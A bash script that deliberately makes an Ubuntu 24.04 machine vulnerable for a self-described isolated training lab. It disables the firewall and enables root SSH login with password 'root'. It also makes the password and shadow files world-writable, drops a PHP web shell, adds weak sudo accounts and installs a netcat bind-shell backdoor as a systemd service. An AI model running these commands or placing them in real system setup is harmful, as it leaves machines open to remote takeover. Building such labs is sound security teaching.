#!/bin/bash
# Intentionally Vulnerable Script for Ubuntu 24.04
# Use ONLY in an isolated educational lab environment!
# Run as root or with sudo privileges.

echo "Creating a vulnerable Ubuntu Desktop 24.04 environment..."

# -------------------------------
# BEGINNER: Basic Vulnerabilities
# -------------------------------

echo "Disabling UFW firewall and allowing all connections..."
ufw disable
iptables -F
echo "Firewall disabled. All ports are now open."

echo "Installing and enabling SSH with root login enabled..."
apt update
apt install -y openssh-server
sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
echo "root:root" | chpasswd
systemctl restart sshd
echo "SSH installed. Root login is enabled with the password: root."

echo "Setting weak permissions on sensitive files..."
chmod 777 /etc/passwd /etc/shadow
echo "Sensitive system files now have weak permissions."

# -------------------------------
# INTERMEDIATE: Services Mismanagement
# -------------------------------

echo "Installing and misconfiguring Apache for WebShell exploitation..."
apt install -y apache2 php
cat <<EOF > /var/www/html/webshell.php
<?php if(isset(\$_GET['cmd'])) { echo shell_exec(\$_GET['cmd']); }?>
EOF
chmod 777 /var/www/html/webshell.php
systemctl enable apache2 && systemctl start apache2
echo "Apache installed with a PHP-based backdoor uploaded (webshell.php)."

echo "Creating an insecure cron job..."
echo "* * * * * root bash -c 'echo compromised > /tmp/cron.log'" > /etc/cron.d/insecure-cron
chmod 777 /etc/cron.d/insecure-cron
echo "A poorly secured cron job has been created and set to run as root."

# -------------------------------
# ADVANCED: Hardening and Persistence
# -------------------------------

echo "Injecting users with insecure passwords..."
useradd -m hacker
echo "hacker:hackme" | chpasswd
usermod -aG sudo hacker
echo "Account 'hacker' added with sudo privileges and password 'hackme'."

echo "Injecting a root startup backdoor..."
cat <<EOF > /etc/systemd/system/backdoor.service
[Unit]
Description=Root Backdoor
[Service]
ExecStart=/bin/bash -c 'nc -lvp 4444 -e /bin/bash'
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
systemctl start backdoor
echo "Netcat backdoor added as a systemd service listening on port 4444."

echo "Weakening system-wide security settings..."
sysctl -w net.ipv4.ip_forward=1
sysctl -w kernel.randomize_va_space=0
echo "IPv4 forwarding enabled and ASLR disabled. Students must fix these configurations."

echo "Vulnerable Ubuntu Desktop environment configuration complete!"